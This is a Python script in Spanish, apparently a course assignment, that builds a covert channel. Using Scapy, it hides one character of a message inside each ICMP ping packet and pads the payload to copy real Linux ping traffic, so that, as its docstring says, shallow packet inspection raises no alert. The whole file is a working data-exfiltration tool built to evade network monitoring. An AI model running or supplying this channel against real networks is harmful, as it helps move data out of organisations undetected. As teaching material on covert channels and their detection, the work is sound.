#!/usr/bin/env python3
"""
Actividad 2 - Modo Stealth: envío de datos en paquetes ICMP
Envía un carácter por paquete ICMP Echo Request, imitando tráfico real de ping.

Uso: sudo python3 pingv4.py "mensaje_cifrado" [ip_destino]
Ejemplo: sudo python3 pingv4.py "larycxpajorj h bnpdarmjm nw anmnb" 127.0.0.1

Requiere: pip install scapy  |  Debe ejecutarse con sudo
"""
import sys
import time
import struct
import os
from scapy.all import IP, ICMP, Raw, send, conf

conf.verb = 0  # Silenciar output interno de Scapy


# ──────────────────────────────────────────────
# Construcción del campo DATA del paquete ICMP
# ──────────────────────────────────────────────
def construir_data_ping(char: str) -> bytes:
    """
    Arma 48 bytes de payload imitando exactamente el ping real de Linux:

      [0:8]  → timestamp (double 8 bytes), igual que en ping real
      [8]    → nuestro carácter embebido  ← dato oculto
      [9:48] → padding secuencial 0x11, 0x12, ... (igual que ping real usa 0x10...)

    El resultado tiene el mismo largo y estructura que un ping por defecto,
    por lo que no levanta alertas en un DPI superficial.
    """
    timestamp = struct.pack("d", time.time())          # 8 bytes de timestamp
    char_byte  = char.encode('latin-1')                # 1 byte: nuestro carácter
    padding    = bytes(range(0x11, 0x11 + (48 - 9)))   # 39 bytes de padding secuencial
    return timestamp + char_byte + padding             # total = 48 bytes

# ──────────────────────────────────────────────
# Envío principal
# ──────────────────────────────────────────────
def enviar_stealth(mensaje: str, destino: str = "192.168.0.27"):
    icmp_id = os.getpid() & 0xFFFF
    print(f"[*] Destino  : {destino}")
    print(f"[*] Mensaje  : {mensaje!r}  ({len(mensaje)} caracteres → {len(mensaje)} paquetes)")
    print(f"[*] ICMP ID  : {icmp_id:#06x}\n")

    for seq, char in enumerate(mensaje, start=1):
        data   = construir_data_ping(char)
        paquete = IP(dst=destino) / ICMP(type=8, code=0, id=icmp_id, seq=seq) / Raw(load=data)

        send(paquete)
        print(".")
        print("Sent 1 packets.")
        time.sleep(1)

    print(f"\n[+] Transmisión completa — {len(mensaje)} paquetes enviados.")
    print(f"[*] Último carácter transmitido: {mensaje[-1]!r}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Uso: sudo python3 {sys.argv[0]} \"mensaje_cifrado\" [ip_destino]")
        sys.exit(1)

    mensaje = sys.argv[1]
    destino = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
    enviar_stealth(mensaje, destino)